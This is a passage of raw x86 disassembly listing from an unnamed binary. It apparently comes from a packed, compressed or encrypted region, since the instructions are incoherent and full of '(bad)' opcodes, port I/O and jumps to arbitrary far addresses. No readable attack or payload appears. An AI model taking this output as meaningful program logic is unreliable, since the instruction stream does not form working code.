  417f5a:	sbb    dh,BYTE PTR [edx-0x35]
  417f5d:	inc    ebx
  417f5e:	xchg   DWORD PTR [ebx-0x1cada4e8],edx
  417f64:	xchg   BYTE PTR [ecx-0x869fd94],ah
  417f6a:	cli    
  417f6b:	inc    ebx
  417f6c:	enter  0xb,0x0
  417f70:	cmp    al,0xa7
  417f72:	enter  0x7d,0x0
  417f76:	mov    WORD PTR [ebp+0x0],gs
  417f79:	add    BYTE PTR [ecx],dh
  417f7b:	inc    esi
  417f7c:	jns    0x417f5b
  417f7e:	inc    esp
  417f7f:	add    BYTE PTR [bx+si],al
  417f82:	test   al,0x91
  417f84:	mov    dl,0x7b
  417f86:	xchg   edi,eax
  417f87:	gs dec esp
  417f89:	pop    ebp
  417f8a:	add    BYTE PTR [eax],al
  417f8c:	cmp    al,0x90
  417f8e:	mov    ebp,0x5c58315f
  417f93:	stos   DWORD PTR es:[edi],eax
  417f94:	scas   eax,DWORD PTR es:[edi]
  417f95:	dec    ecx
  417f96:	das    
  417f97:	inc    edi
  417f98:	into   
  417f99:	push   cs
  417f9a:	xor    al,0xe7
  417f9c:	sub    cl,BYTE PTR [esi]
  417f9e:	(bad)  
  417f9f:	aad    0xaa
  417fa1:	and    esi,DWORD PTR [edi]
  417fa3:	test   BYTE PTR ds:[ebx+0xe670000],dh
  417faa:	ret    0x418b
  417fad:	mov    ebp,0xddc3a56d
  417fb2:	dec    edi
  417fb3:	jg     0x417fd8
  417fb5:	test   dl,0xc9
  417fb8:	push   cs
  417fb9:	sub    eax,0xae54c366
  417fbe:	sbb    BYTE PTR [eax],al
  417fc0:	add    eax,DWORD PTR [eax]
  417fc2:	add    BYTE PTR [edx],dl
  417fc4:	ins    BYTE PTR es:[edi],dx
  417fc5:	ins    BYTE PTR es:[edi],dx
  417fc6:	xchg   ebp,eax
  417fc7:	fs fcmovnb st,st(5)
  417fca:	fild   WORD PTR [esi+esi*4+0x0]
  417fce:	add    BYTE PTR [edi-0x46],cl
  417fd1:	push   es
  417fd2:	mov    WORD PTR [ecx],gs
  417fd4:	add    BYTE PTR [eax],al
  417fd6:	fadd   DWORD PTR [esi+0x2258d529]
  417fdc:	mov    edi,0xd8971313
  417fe1:	pop    ds
  417fe2:	fnstenv [edi-0x37]
  417fe5:	push   0x311f3301
  417fea:	sub    BYTE PTR [ebx],ch
  417fec:	sar    edi,1
  417fee:	add    ah,0x0
  417ff1:	add    BYTE PTR [esi-0x31],ah
  417ff4:	jmp    0x418011
  417ff6:	adc    BYTE PTR [edi+0x0],0x0
  417ffa:	call   0x51b6:0x2c3b50a
  418001:	jl     0x418046
  418003:	pop    esi
  418004:	cld    
  418005:	sar    DWORD PTR [ecx],cl
  418007:	mov    ah,0xfd
  418009:	fsubrp st(6),st
  41800b:	int3   
  41800c:	and    al,BYTE PTR [eax]
  41800e:	add    dh,ch
  418010:	mov    dl,0xf0
  418012:	dec    esp
  418013:	aaa    
  418014:	add    BYTE PTR [eax],al
  418016:	add    bh,BYTE PTR [ecx]
  418018:	xchg   ebx,eax
  418019:	add    BYTE PTR [edx+0x0],ch
  41801c:	add    BYTE PTR [esi-0x69],bl
  41801f:	jmp    0xd9c6adcb
  418024:	mov    dh,0x5c
  418026:	jmp    0x417fe7
  418028:	ret    0x88bf
  41802b:	stos   BYTE PTR es:[edi],al
  41802c:	add    BYTE PTR [eax],al
  41802e:	dec    ebx
  41802f:	mov    edi,0x3932e3f9
  418034:	pop    eax
  418035:	jnp    0x41808a
  418037:	data16 jae 0x418000
  41803a:	into   
  41803b:	inc    ebx
  41803c:	sub    DWORD PTR [edx-0x21],edx
  41803f:	push   esp
  418040:	inc    eax
  418041:	push   ss
  418042:	add    BYTE PTR [eax],al
  418044:	jb     0x41a012
  41804a:	scas   eax,DWORD PTR es:[edi]
  41804b:	and    eax,0x43b5c1e0
  418050:	inc    ebp
  418051:	cmp    cl,BYTE PTR [esi+0x6ab47c33]
  418057:	push   0xffffff9c
  418059:	in     eax,0x5f
  41805b:	mov    ds:0xbe7b9ae7,al
  418060:	(bad)  [edx+0x1a223ded]
  418066:	push   ebp
  418067:	push   ds
  418068:	pop    edx
  418069:	and    bh,ch
  41806b:	ss sbb al,0x2d
  41806e:	jecxz  0x418033
  418070:	xchg   BYTE PTR [esi+0x7f],cl
  418073:	add    DWORD PTR [ebp+0x72],edi
  418076:	pushw  ds
  418078:	xor    BYTE PTR [edi],0x0
  41807b:	add    dh,cl
  41807d:	scas   al,BYTE PTR es:[edi]
  41807e:	(bad)  
  418080:	aad    0xe6
  418082:	push   esi
  418083:	aas    
  418084:	xor    bh,0x0
  418087:	add    BYTE PTR [edi],dh
  418089:	mov    DWORD PTR [ecx+0x32696eef],esp
  41808f:	rcl    DWORD PTR [ebp+0x78],1
  418092:	pusha  
  418093:	in     al,dx
  418094:	stos   BYTE PTR es:[edi],al
  418095:	adc    cl,dh
  418097:	sub    cl,bl
  418099:	fs mov ecx,esp
  41809c:	(bad)
  41809f:	inc    ebp
  4180a0:	jae    0x4180c5
  4180a2:	and    al,0x9d
  4180a4:	ja     0x418109
  4180a6:	xchg   edx,eax
  4180a7:	int    0x7c
  4180a9:	dec    ecx
  4180aa:	push   ebx
  4180ab:	pop    ebp
  4180ac:	in     al,dx
  4180ad:	out    0x20,al
  4180af:	add    esp,DWORD PTR [ebx+ebp*1+0x19]
  4180b3:	das    
  4180b4:	inc    eax
  4180b5:	mov    DWORD PTR [eax],eax
  4180b7:	add    BYTE PTR [ebx-0x6f],ah
  4180ba:	pushf  
  4180bb:	mov    edi,0x78dc243
  4180c0:	jne    0x4180a4
  4180c2:	hlt    
  4180c3:	stc    
  4180c4:	mov    ?,WORD PTR [esi]
  4180c6:	pop    edx
  4180c7:	or     al,0x2b
  4180c9:	add    BYTE PTR [eax],al
  4180cb:	mov    ebp,0x5744f3
  4180d0:	add    BYTE PTR [edx+0x6c],bl
  4180d3:	lea    ebp,[ebx+0xd01e794]
  4180d9:	push   0x1e
  4180db:	int    0x92
  4180dd:	int3   
  4180de:	imul   eax,DWORD PTR [eax],0x0
  4180e1:	mov    ss,WORD PTR [ebx-0x159b62a0]
  4180e7:	rcl    bh,cl
  4180e9:	xor    dl,0x0
  4180ec:	add    BYTE PTR [eax-0x6e],bh
  4180ef:	(bad)  
  4180f1:	inc    ebp
  4180f2:	test   BYTE PTR [eax+eax*1+0x0],ch
  4180f6:	and    DWORD PTR [edi],eax
  4180f8:	in     eax,dx
  4180f9:	mov    bl,0x74
  4180fb:	mov    ss,WORD PTR [ebx-0x194e7d61]
  418101:	cmp    dh,BYTE PTR [ecx]
  418103:	cmc    
  418104:	xor    DWORD PTR [eax-0x5b],ecx
  418107:	add    BYTE PTR [eax],al
  418109:	mov    ds:0xd6943f4d,eax
  41810e:	pop    ds
  41810f:	and    ch,BYTE PTR [eax+0x1e]
  418112:	push   0xffffff9d
  418114:	cli    
  418115:	lock (bad) 
  418117:	outs   dx,BYTE PTR ds:[esi]
  418118:	add    eax,0x25c047
  41811d:	add    bl,dh
  41811f:	sub    al,0x16
  418121:	xor    BYTE PTR [eax-0x136fc93e],dl
  418127:	push   0xae289b8
  41812c:	xchg   DWORD PTR [edx-0x8],edi
  41812f:	(bad)  
  418130:	mov    cx,0x44d2
  418134:	jo     0x418136
  418136:	add    dh,dh
  418138:	int3   
  418139:	sbb    eax,0xd8dd0000
  41813e:	(bad)  
  41813f:	(bad)  
  418140:	cmp    eax,0x39297c18
  418145:	xor    eax,ebx
  418147:	jbe    0x41812e
  418149:	iret   
  41814a:	iret   
  41814b:	add    DWORD PTR [eax+0x2a],edx
  41814e:	pushf  
  41814f:	sub    esi,DWORD PTR [ecx]
  418151:	dec    ebx
  418152:	lods   al,BYTE PTR ds:[esi]
  418153:	and    DWORD PTR [ecx+esi*8+0x0],ecx
  418157:	add    BYTE PTR [edx+0x5d],bh
  41815a:	sub    eax,0xe99ef866
  41815f:	adc    dh,BYTE PTR ds:0xd6742c9e
  418165:	adc    al,0x12
  418167:	sub    eax,0x97906fa3
  41816c:	sahf   
  41816d:	xor    ebp,edx
  41816f:	jmp    0x5f1c:0x4af52ff5
  418176:	je     0x41812c
  418178:	call   FWORD PTR [esp+eax*1+0x1d00002e]
  41817f:	push   es
  418180:	cmp    eax,0x43d35ed0
  418185:	pop    ss
  418186:	pop    esp
  418187:	adc    edx,edx
  418189:	retf   0xa18a
  41818c:	mov    ds:0xca6e011e,eax
  418191:	repnz push es
  418193:	cld    
  418194:	mov    ebx,0xda642f94
  418199:	(bad)  
  41819a:	bound  esp,QWORD PTR [ebx+esi*1+0x1a]
  41819e:	jp     0x4181e8
  4181a0:	cmp    DWORD PTR [eax],eax
  4181a2:	add    BYTE PTR [edx+ecx*2-0x4d15c75b],dh
  4181a9:	mov    al,ds:0xe3fb1415
  4181ae:	mov    bl,0x71
  4181b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181b1:	pop    esi
  4181b2:	neg    BYTE PTR ds:0x5fdda75f
  4181b8:	iret   
  4181b9:	cmp    al,BYTE PTR [ebp-0x54da8f77]
  4181bf:	rcr    BYTE PTR [eax],1
  4181c1:	data16 cli 
  4181c3:	mov    ch,0xf2
  4181c5:	mul    BYTE PTR [esi+0x138b9579]
  4181cb:	push   esp
  4181cc:	es loopne 0x41824c
  4181cf:	inc    esp
  4181d0:	cmp    BYTE PTR [eax],al
  4181d2:	add    BYTE PTR [ecx-0x70bb8473],dh
  4181d8:	add    BYTE PTR [eax],al
  4181da:	(bad)  
  4181db:	in     eax,dx
  4181dc:	dec    ecx
  4181dd:	aas    
  4181de:	adc    cl,BYTE PTR [ebp+0x4ddb94bf]
  4181e4:	sbb    DWORD PTR [esi-0x44ff6d29],0x0
  4181eb:	add    BYTE PTR [ebp+ecx*2-0x3e],dl
  4181ef:	imul   ebx,DWORD PTR [ebx],0xd8b27151
  4181f5:	mov    edi,0x438cff99
  4181fa:	add    BYTE PTR [eax],al
  4181fc:	jecxz  0x418276
  4181fe:	(bad)  
  4181ff:	shl    ebp,1
  418201:	out    dx,al
  418202:	ss or  eax,0xae71d5f6
  418208:	icebp  
  418209:	cli    
  41820a:	jmp    0x4181cd
  41820c:	aam    0x3a
  41820e:	or     eax,0x10eee2e3
  418213:	jp     0x4181ca
  418215:	xchg   ecx,eax
  418216:	fidivr WORD PTR [edx-0x59565f16]
  41821c:	dec    edi
  41821d:	fldenv [eax+0x75b858b8]
  418223:	or     DWORD PTR [edi+eax*1-0x46578a1a],esi
  41822a:	sbb    edx,DWORD PTR ss:[ebx]
  41822d:	xlat   BYTE PTR ds:[ebx]
  41822e:	xchg   ebp,eax
  41822f:	imul   DWORD PTR [esi]
  418231:	leave  
  418232:	push   eax
  418233:	ja     0x41824a
  418235:	std    
  418236:	sub    cl,BYTE PTR [eax]
  418238:	push   edi
  418239:	add    BYTE PTR [eax],al
  41823b:	sbb    DWORD PTR [edi-0x1],ecx
  41823e:	(bad)  
  41823f:	push   esi
  418240:	cwde   
  418241:	jl     0x41827f
  418243:	fimul  DWORD PTR [ecx-0x24]
  418246:	xchg   esi,eax
  418247:	and    eax,0xda105105
  41824c:	cmp    BYTE PTR [edi+edx*2-0x22ddb697],ah
  418253:	dec    ebx
  418254:	xchg   edx,eax
  418255:	adc    BYTE PTR [edx+eiz*1+0x0],cl
  418259:	add    BYTE PTR [esi+ebp*1],ch
  41825c:	fild   DWORD PTR [edi+0x499f51b4]
  418262:	aam    0xcd
  418264:	dec    ebp
  418265:	adc    al,0x5a
  418267:	mov    ebp,0xd3816ccb
  41826c:	in     al,dx
  41826d:	and    edi,eax
  41826f:	mov    cl,0x5f
  418271:	out    0x9a,eax
  418273:	ja     0x418234
  418275:	dec    esp
  418276:	mov    eax,ds:0x1210000
  41827b:	jbe    0x4182a5
  41827d:	imul   esi,DWORD PTR ds:0x190be491,0x3d
  418284:	push   ds
  418285:	cs retf 0x3316
  418289:	pop    es
  41828a:	lea    ebp,[ebx+edi*8]
  41828d:	cmp    DWORD PTR [ebp+0x2d0ba751],ecx
  418293:	sti    
  418294:	cs loope 0x41824d
  418297:	hlt    
  418298:	jg     0x4182a9
  41829a:	push   ds
  41829b:	mov    WORD PTR [ecx],?
  41829d:	add    BYTE PTR [eax],al
  41829f:	sub    al,0xae
  4182a1:	repnz inc esp
  4182a3:	int3   
  4182a4:	add    BYTE PTR [eax],al
  4182a6:	sahf   
  4182a7:	pop    esi
  4182a8:	or     cl,bh
  4182aa:	(bad)  
  4182ab:	pop    ss
  4182ac:	push   0x3083e7db
  4182b1:	mov    ecx,esi
  4182b3:	add    eax,0xaa84
  4182b8:	ds sbb edx,edx
  4182bb:	sahf   
  4182bc:	mov    esi,0x1800
  4182c1:	lods   al,BYTE PTR ds:[esi]
  4182c2:	cmp    BYTE PTR [ecx+0x7f849073],ch
  4182c8:	add    BYTE PTR [eax],al
  4182ca:	push   edx
  4182cb:	jmp    0xb92366c1
  4182d0:	ror    ebp,0x3
  4182d3:	in     eax,dx
  4182d4:	xor    BYTE PTR [ecx],al
  4182d6:	add    al,0x3
  4182d8:	add    BYTE PTR [eax],al
  4182da:	push   ebp
  4182db:	add    ecx,DWORD PTR [edx]
  4182dd:	sbb    al,0x7a
  4182df:	xchg   ebp,eax
  4182e0:	and    dh,cl
  4182e2:	div    BYTE PTR [esi]
  4182e4:	xor    eax,0x29128956
  4182e9:	in     al,dx
  4182ea:	or     al,0xcb
  4182ec:	add    BYTE PTR [eax],al
  4182ee:	push   cs
  4182ef:	xchg   esp,eax
  4182f0:	call   0x44677815
  4182f5:	mov    bl,0x0
  4182f7:	add    BYTE PTR [edi-0xe373291],bh
  4182fd:	add    BYTE PTR [eax],al
  4182ff:	mov    edi,0xe8a8474e
  418304:	pop    DWORD PTR [esi+edx*1+0x0]
  418308:	add    BYTE PTR [ebx],bh
  41830a:	pop    eax
  41830b:	cmp    DWORD PTR [edx+0x608090ee],esi
  418311:	add    BYTE PTR [eax],al
  418313:	jmp    0x54adda08
  418318:	push   ds
  418319:	test   dh,0x7a
  41831c:	repnz leave 
  41831e:	mov    eax,0xd2b34156
  418323:	push   ds
  418324:	in     al,0xd2
  418326:	push   cs
  418327:	inc    esi
  418328:	sub    BYTE PTR [edi-0x3fe17a7b],dh
  41832e:	lahf   
  41832f:	add    BYTE PTR [eax],al
  418331:	jne    0x4182ed
  418333:	jmp    0x418369
  418335:	out    dx,eax
  418336:	mov    cl,0x8d
  418338:	lahf   
  418339:	dec    esp
  41833a:	cmp    BYTE PTR [eax],al
  41833c:	add    ah,bl
  41833e:	mov    cl,0x22
  418340:	fadd   QWORD PTR [edx]
  418342:	push   ss
  418343:	out    0x97,al
  418345:	js     0x418335
  418347:	pop    ds
  418348:	mov    dl,0x1f
  41834a:	and    BYTE PTR [eax],ah
  41834c:	pusha  
  41834d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41834e:	mov    eax,0x78afe56e
  418353:	arpl   WORD PTR [esi],dx
  418355:	sub    eax,0xb1c4
  41835a:	mov    edx,0x4088
  41835f:	pop    edx
  418360:	in     eax,0xde
  418362:	stos   DWORD PTR es:[edi],eax
  418363:	jmp    0x418321
  418365:	sub    eax,0xa86fefc3
  41836a:	mov    edx,0xf943aa14
  41836f:	retf   
  418370:	rcr    BYTE PTR [ebx],0x0
  418373:	add    BYTE PTR [ebx],al
  418375:	lds    esi,FWORD PTR [ecx+0x67]
  418378:	das    
  418379:	mov    ch,0xd1
  41837b:	or     DWORD PTR [esi+0x6e],esi
  41837e:	pop    edi
  41837f:	into   
  418380:	adc    al,0x8d
  418382:	(bad)  [eax-0x43]
  418385:	jnp    0x418401
  418387:	or     ebx,DWORD PTR [eax]
  418389:	or     al,0xe6
  41838b:	add    BYTE PTR [eax],al
  41838d:	push   ecx
  41838e:	add    dl,BYTE PTR [edx]
  418390:	and    ebx,DWORD PTR [edx]
  418392:	jmp    0xd343:0x2884
  418399:	or     ah,0x4e
  41839c:	add    BYTE PTR [eax],al
  41839e:	ret    
  41839f:	jp     0x418391
  4183a1:	rol    ebx,1
  4183a3:	xchg   edx,eax
  4183a4:	inc    edi
  4183a5:	and    bl,al
  4183a7:	xchg   ebp,eax
  4183a8:	hlt    
  4183a9:	mov    dh,0x9a
  4183ab:	push   esp
  4183ac:	jl     0x418421
  4183ae:	(bad)  
  4183af:	xchg   esp,eax
  4183b0:	adc    ch,BYTE PTR [edx-0x39]
  4183b3:	call   0x2a79306d
  4183b8:	imul   ecx,DWORD PTR [ecx+0x64025ce1],0x9263c3cf
  4183c2:	pop    ebx
  4183c3:	lods   al,BYTE PTR ds:[esi]
  4183c4:	ja     0x418385
  4183c6:	sub    eax,0x481e578a
  4183cb:	aaa    
  4183cc:	add    BYTE PTR [eax],al
  4183ce:	cs mov dl,0xf9
  4183d1:	or     eax,0x9488f9
  4183d6:	add    BYTE PTR [ecx+0x4f],ah
  4183d9:	xchg   esi,eax
  4183da:	and    eax,0x523ba8f4
  4183df:	sbb    al,0x5
  4183e1:	cli    
  4183e2:	pop    eax
  4183e3:	test   dh,dl
  4183e5:	add    BYTE PTR [eax],al
  4183e7:	xor    ebp,DWORD PTR [ebp-0xd24bc5d]
  4183ed:	dec    esp
  4183ee:	mov    BYTE PTR [eax],0x0
  4183f1:	repnz daa 
  4183f3:	jo     0x41840e
  4183f5:	xchg   BYTE PTR [esi],bl
  4183f7:	push   eax
  4183f8:	sub    eax,0xd088d669
  4183fd:	add    BYTE PTR [eax],al
  4183ff:	and    DWORD PTR ss:0xe62309ca,0x3b66d50b
  41840a:	loop   0x4183dd
  41840c:	jl     0x41843b
  41840e:	dec    edi
  41840f:	cld    
  418410:	cdq    
  418411:	xchg   BYTE PTR [ebx+0x6c2bca7a],dh
  418417:	mov    bh,0xa3
  418419:	pushf  
  41841a:	ds xchg esp,eax
  41841c:	jo     0x4183b1
  41841e:	lahf   
  41841f:	scas   eax,DWORD PTR es:[edi]
  418420:	repz mov cl,BYTE PTR ds:0x7de545cd
  418427:	dec    esp
  418428:	push   eax
  418429:	add    BYTE PTR [eax],al
  41842b:	aaa    
  41842c:	mov    bl,0x35
  41842e:	mov    ds:0xd61a1c6e,al
  418433:	into   
  418434:	into   
  418435:	aam    0x8b
  418437:	sbb    BYTE PTR [edi-0x4fdb1806],al
  41843d:	jae    0x41845c
  41843f:	leave  
  418440:	in     eax,0x22
  418442:	test   BYTE PTR [eax+0x52af0000],bh
  418448:	clc    
  418449:	dec    esp
  41844a:	mov    BYTE PTR [eax],0x0
  41844d:	ror    DWORD PTR [esi-0x7670e8bb],1
  418453:	add    eax,0xe198f2ea
  418458:	push   ebx
  418459:	sti    
  41845a:	sbb    BYTE PTR [esi],al
  41845c:	jle    0x41840d
  41845e:	rol    BYTE PTR [eax+0x3a0000cb],cl
  418464:	les    ecx,FWORD PTR [eax+eax*1+0x0]
  418468:	sub    bl,bl
  41846a:	hlt    
  41846b:	push   esi
  41846c:	inc    ebx
  41846d:	xchg   ebx,eax
  41846e:	xchg   ebx,eax
  41846f:	rcr    DWORD PTR [edi],1
  418471:	sbb    eax,0xbdabfe5f
  418476:	nop
  418477:	test   eax,0x79a1566b
  41847c:	and    esi,esp
  41847e:	les    ecx,FWORD PTR [ecx+0x0]
  418481:	add    ch,dh
  418483:	mov    al,ds:0xa5f4f651
  418488:	fcomp  DWORD PTR [edx+0x72]
  41848b:	js     0x418479
  41848d:	push   ebx
  41848e:	lods   al,BYTE PTR ds:[esi]
  41848f:	push   es
  418490:	cld    
  418491:	or     DWORD PTR [ebx+0x20],edi
  418494:	xor    ah,dl
  418496:	nop
  418497:	or     eax,0x3aeeaeda
  41849c:	adc    bh,bl
  41849e:	pop    edx
  41849f:	pushf  
  4184a0:	mov    BYTE PTR [esi+0x66],0xf6
  4184a4:	jmp    0xd6f2c2aa
  4184a9:	xchg   esi,eax
  4184aa:	mov    ch,0x73
  4184ac:	add    eax,0x8c06e3e0
  4184b1:	sbb    al,BYTE PTR [eax]
  4184b3:	add    BYTE PTR [ebp+0x4f63713b],dl
  4184b9:	inc    edi
  4184ba:	mov    eax,ds:0xe86d0bfa
  4184bf:	pop    esi
  4184c0:	pop    esp
  4184c1:	jle    0x41851c
  4184c3:	push   ds
  4184c4:	aam    0x5f
  4184c6:	out    0xcb,al
  4184c8:	fstp   QWORD PTR [eax]
  4184ca:	mov    dl,0x5b
  4184cc:	mov    bl,0xd9
  4184ce:	fisub  DWORD PTR [ebx-0xbc3d86d]
  4184d4:	jmp    FWORD PTR [eax]
  4184d6:	neg    BYTE PTR [ebx+0x280a59ef]
  4184dc:	in     eax,dx
  4184dd:	xchg   esi,eax
  4184de:	xchg   esp,eax
  4184df:	xchg   DWORD PTR [edx-0x56],esp
  4184e2:	inc    ebx
  4184e3:	daa    
  4184e4:	mov    al,ds:0xfd41cadb
  4184e9:	mov    ah,0xed
  4184eb:	mov    ds:0x900cfd,eax
  4184f0:	add    BYTE PTR [ebp-0x8a842ff],dh
  4184f6:	aam    0x34
  4184f8:	mov    cs,WORD PTR [esp+eax*8-0x132f0000]
  4184ff:	inc    edx
  418500:	jmp    0x5367a564
  418505:	int3   
  418506:	lahf   
  418507:	add    BYTE PTR [eax],al
  418509:	xchg   DWORD PTR [eax],ebp
  41850b:	fidiv  DWORD PTR [edi]
  41850d:	inc    esi
  41850e:	inc    eax
  41850f:	dec    esp
  418510:	add    BYTE PTR [eax],al
  418512:	adc    BYTE PTR [ecx+ebp*8],dh
  418515:	nop
  418516:	jmp    0xed20:0x55ee7dbe
  41851d:	stos   BYTE PTR es:[edi],al
  41851e:	ja     0x41855c
  418520:	mov    dl,BYTE PTR [ebx+0x33d3203]
  418526:	inc    ecx
  418527:	add    esp,DWORD PTR [eax]
  418529:	dec    esi
  41852a:	ror    cl,0x0
  41852d:	add    dh,cl
  41852f:	(bad)  
  418530:	pop    ebp
  418531:	data16 adc bl,BYTE PTR [edi+0x4f]
  418535:	jl     0x4185a7
  418537:	fs xchg ebp,eax
  418539:	clc    
  41853a:	xchg   edi,eax
  41853b:	pop    ss
  41853c:	jecxz  0x418552
  41853e:	xor    DWORD PTR [eax],edx
  418540:	cli    
  418541:	cmp    esi,ebp
  418543:	fwait
  418544:	inc    ecx
  418545:	or     eax,0x7c7f0132
  41854a:	sub    BYTE PTR [edi+0x3008e643],bl
  418550:	add    BYTE PTR [eax],al
  418552:	mov    al,ds:0xad2cbae0
  418557:	mov    bh,0x57
  418559:	mov    edi,0xcf4e981c
  41855e:	mov    ebx,eax
  418560:	out    0x48,eax
  418562:	mov    BYTE PTR [eax],0x0
  418565:	fs js  0x418515
  418568:	js     0x418552
  41856a:	fidivr DWORD PTR [eax-0x55]
  41856d:	jle    0x418530
  41856f:	call   FWORD PTR [esi]
  418571:	or     dl,BYTE PTR [ecx+0x49]
  418574:	cmc    
  418575:	cmp    DWORD PTR [ebx+0x7],edx
  418578:	neg    BYTE PTR [ecx]
  41857a:	adc    DWORD PTR [ebx+ebp*8],ecx
  41857d:	add    BYTE PTR [eax],al
  41857f:	inc    esp
  418580:	pop    esp
  418581:	add    BYTE PTR [eax],al
  418583:	retf   
  418584:	popa   
  418585:	mov    bl,0xfc
  418587:	lods   eax,DWORD PTR ds:[esi]
  418588:	(bad)  
  418589:	fisubr DWORD PTR [esi+0x61bc3caa]
  41858f:	bound  ecx,QWORD PTR [ebp+0x5d]
  418592:	rcr    ebp,1
  418594:	das    
  418595:	icebp  
  418596:	imul   edx,DWORD PTR [esi],0xf1aa0ed1
  41859c:	fld    DWORD PTR [esi-0x94d4515]
  4185a2:	sub    ebp,DWORD PTR [eax-0x80]
  4185a5:	stos   BYTE PTR es:[edi],al
  4185a6:	add    BYTE PTR [eax],al
  4185a8:	outs   dx,DWORD PTR ds:[esi]
  4185a9:	xchg   edi,eax
  4185aa:	xor    ah,bh
  4185ac:	icebp  
  4185ad:	lahf   
  4185ae:	push   edx
  4185af:	inc    ecx
  4185b0:	das    
  4185b1:	adc    eax,0xcef17f5b
  4185b6:	mov    al,BYTE PTR [ebx-0x30]
  4185b9:	dec    ebp
  4185ba:	xchg   esi,eax
  4185bb:	xlat   BYTE PTR ds:[ebx]
  4185bc:	xor    esi,DWORD PTR [esi+0x8539cf5]
  4185c2:	pop    ebx
  4185c3:	add    BYTE PTR [eax],al
  4185c5:	adc    eax,0xa369a286
  4185ca:	mov    eax,0x57a1d4e6
  4185cf:	out    dx,al
  4185d0:	xor    eax,0x35227379
  4185d5:	into   
  4185d6:	xor    bl,BYTE PTR [eax]
  4185d8:	nop
  4185d9:	xchg   edx,eax
  4185da:	in     al,dx
  4185db:	jp     0x4185fe
  4185dd:	cli    
  4185de:	mov    ah,BYTE PTR [ebx]
  4185e0:	loopne 0x41860b
  4185e2:	sbb    eax,0x8e9f9e0
  4185e7:	sbb    eax,DWORD PTR [eax]
  4185e9:	add    BYTE PTR [ecx+ebp*8-0x12ef2586],bl
  4185f0:	stos   BYTE PTR es:[edi],al
  4185f1:	call   0xce26:0x286c6133
  4185f8:	pusha  
  4185f9:	pop    esi
  4185fa:	pop    edx
  4185fb:	fbld   TBYTE PTR [ebx+0x2a2f50ab]
  418601:	mov    cs,ebp
  418603:	outs   dx,BYTE PTR ds:[esi]
  418604:	call   0xdc7a0c3c
  418609:	data16 add dl,BYTE PTR ds:0x1a78267c
  418610:	add    BYTE PTR [ebp-0x18ae0000],ah
  418616:	enter  0xa1,0x0
  41861a:	mov    ah,0x29
  41861c:	repz push ecx
  41861e:	cmc    
  41861f:	adc    al,0x3b
  418621:	mov    ecx,0xc0d527c3
  418626:	ins    BYTE PTR es:[edi],dx
  418627:	add    BYTE PTR [eax],al
  418629:	xchg   ecx,eax
  41862a:	mov    DWORD PTR [eax+0x6086034f],esi
  418630:	jmp    0xd0088f4a
  418635:	mov    al,0xa6
  418637:	into   
  418638:	pop    ds
  418639:	mov    cl,0xa2
  41863b:	js     0x41861c
  41863d:	mov    ecx,0xad2171cd
  418642:	add    eax,0xc94dff9b
  418647:	jns    0x4185fd
  418649:	xchg   ebx,eax
  41864a:	push   cs
  41864b:	add    BYTE PTR [ebp+0x0],bl
  41864e:	add    BYTE PTR [edi-0x39],bh
  418651:	jmp    0x4185e8
  418653:	ret    0xc96e
  418656:	(bad)  
  418657:	repnz lahf 
  418659:	pop    eax
  41865a:	loopne 0x4185e9
  41865c:	xchg   ebx,eax
  41865d:	retf   
  41865e:	xchg   esp,eax
  41865f:	add    al,bh
  418661:	add    BYTE PTR [eax],al
  418663:	in     eax,0x22
  418665:	or     al,BYTE PTR [ebp+0xf]
  418668:	inc    edx
  418669:	cwde   
  41866a:	xor    edx,DWORD PTR [esi-0x32]
  41866d:	and    edx,ebx
  41866f:	push   cs
  418670:	inc    ecx
  418671:	cdq    
  418672:	jno    0x418689
  418674:	lea    ebx,[ebx-0x754d70e0]
  41867a:	and    DWORD PTR [ecx-0x40bb03d5],0x0
  418681:	add    BYTE PTR [esi+0x56],ch
  418684:	add    al,0x8f
  418686:	add    BYTE PTR [eax],al
  418688:	adc    DWORD PTR [edi+ebx*4+0x0],ecx
  41868c:	add    BYTE PTR [esi+0x67],al
  41868f:	inc    ecx
  418690:	out    0x81,al
  418692:	hlt    
  418693:	in     eax,0x9e
  418695:	add    BYTE PTR [esi+0x0],dl
  418698:	add    BYTE PTR [eax+0x235eb1fe],bl
  41869e:	mov    gs,ecx
  4186a0:	fistp  WORD PTR [ebx-0x74]
  4186a3:	push   ss
  4186a4:	add    BYTE PTR [eax],al
  4186a6:	gs and eax,0x4104
  4186ac:	outs   dx,BYTE PTR ss:[esi]
  4186ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186af:	mov    ah,0x8d
  4186b1:	mov    al,0x3b
  4186b3:	dec    ebx
  4186b4:	pop    ss
  4186b5:	scas   eax,DWORD PTR es:[edi]
  4186b6:	cmp    al,0xd7
  4186b8:	inc    ah
  4186ba:	xchg   BYTE PTR [eax],al
  4186bc:	add    BYTE PTR [ebx-0x41],bl
  4186bf:	fisub  DWORD PTR [ecx+0x2a]
  4186c2:	pop    edi
  4186c3:	das    
  4186c4:	add    ebx,DWORD PTR [eax-0x6476dea3]
  4186ca:	sub    BYTE PTR [esi+0x0],0x0
  4186ce:	jbe    0x41874c
  4186d0:	inc    esi
  4186d1:	ret    0x883b
  4186d4:	xchg   edx,eax
  4186d5:	add    BYTE PTR [eax],al
  4186d7:	cmp    eax,0x922f2eda
  4186dc:	and    al,BYTE PTR [ecx-0x6ae01cae]
  4186e2:	xor    esp,DWORD PTR [ecx+0x3c]
  4186e5:	mov    esp,0x3ef09821
  4186ea:	adc    cl,bh
  4186ec:	xor    bl,BYTE PTR ds:0x4e2a20b7
  4186f2:	mov    dh,0xf9
  4186f4:	clc    
  4186f5:	std    
  4186f6:	dec    esp
  4186f7:	add    BYTE PTR [eax],0x0
  4186fa:	push   cs
  4186fb:	or     eax,DWORD PTR [ebx]
  4186fd:	mov    dh,0x50
  4186ff:	sar    dl,0x0
  418702:	add    BYTE PTR [esp+edx*8+0x13],dl
  418706:	mov    dh,0x19
  418708:	dec    esp
  418709:	(bad)  
  41870a:	add    BYTE PTR [eax],al
  41870c:	test   eax,0x6df26399
  418711:	ret    0xf5e0
  418714:	dec    ebx
  418715:	push   ds
  418716:	cmp    ebp,esi
  418718:	xlat   BYTE PTR ds:[ebx]
  418719:	xchg   ebp,eax
  41871a:	jb     0x4186e8
  41871c:	call   0x8c7f:0xdc5e0000
  418723:	stos   DWORD PTR es:[edi],eax
  418724:	add    BYTE PTR [eax],al
  418726:	mov    esi,DWORD PTR [esi+0x44]
  418729:	repz add BYTE PTR [eax],al
  41872c:	aam    0xca
  41872e:	cli    
  41872f:	std    
